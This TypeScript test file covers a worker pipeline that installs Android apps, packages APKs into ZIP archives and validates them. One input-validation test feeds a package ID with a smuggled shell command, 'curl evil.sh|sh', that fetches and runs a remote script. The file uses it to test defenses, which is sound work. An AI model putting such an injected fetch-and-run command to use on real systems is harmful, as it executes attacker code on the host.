import { describe, it } from 'node:test';
import assert from 'node:assert';
import path from 'path';
import fs from 'fs/promises';
import { existsSync } from 'fs';
import { getInstalledPaths } from './android/adb.js';
import { triggerPlayStoreInstall, getEstimatedInstallCoordinates } from './pipeline/installer.js';
import { packageWorkDirToZip } from './pipeline/packager.js';
import { validateZipArchive } from './pipeline/puller.js';

describe('Worker Unit & Pipeline Tests', () => {
  it('verifies default worker configuration defaults', () => {
    const workerName = process.env.WORKER_NAME || 'test-worker';
    assert.ok(workerName.length > 0);
  });

  it('validates WORKER_TOKEN presence requirement', () => {
    const checkToken = (val?: string) => {
      if (!val) throw new Error('WORKER_TOKEN environment variable is required');
    };
    assert.throws(() => checkToken(undefined), /WORKER_TOKEN environment variable is required/);
    assert.doesNotThrow(() => checkToken('valid_worker_token'));
  });

  describe('getInstalledPaths validation', () => {
    it('returns empty array when packageId contains invalid characters', async () => {
      const result = await getInstalledPaths('com.example;curl evil.sh|sh');
      assert.deepStrictEqual(result, []);
    });
  });

  describe('triggerPlayStoreInstall validation', () => {
    it('throws error when packageId contains injection attempt', async () => {
      await assert.rejects(
        () => triggerPlayStoreInstall('invalid;command', '/tmp'),
        /Invalid packageId format/
      );
    });
  });

  describe('packager module ZIP creation', () => {
    it('creates zip archive from target directory', async () => {
      const testDir = path.join(process.cwd(), 'work', 'test_pkg_dir');
      await fs.mkdir(testDir, { recursive: true });
      await fs.writeFile(path.join(testDir, 'base.apk'), 'fake-apk-binary-content');

      try {
        const result = await packageWorkDirToZip(testDir, 'com.test.app');
        assert.strictEqual(result.fileName, 'com.test.app.zip');
        assert.ok(existsSync(result.zipFilePath));
        assert.ok(result.sha256.length === 64);
      } finally {
        await fs.rm(testDir, { recursive: true, force: true }).catch(() => {});
        await fs.rm(path.join(process.cwd(), 'work', 'com.test.app.zip'), { force: true }).catch(() => {});
      }
    });
  });

  describe('estimated install coordinates calculation', () => {
    it('calculates screen relative coordinates', async () => {
      const coords = await getEstimatedInstallCoordinates();
      assert.ok(coords.x > 0);
      assert.ok(coords.y > 0);
    });
  });

  describe('validateZipArchive validation', () => {
    it('rejects invalid non-ZIP files', async () => {
      const testFilePath = path.join(process.cwd(), 'work', 'invalid.apk');
      await fs.mkdir(path.dirname(testFilePath), { recursive: true });
      await fs.writeFile(testFilePath, 'not-a-zip-file');
      try {
        await assert.rejects(
          () => validateZipArchive(testFilePath),
          /Validation failed/
        );
      } finally {
        await fs.rm(testFilePath, { force: true }).catch(() => {});
      }
    });
  });
});
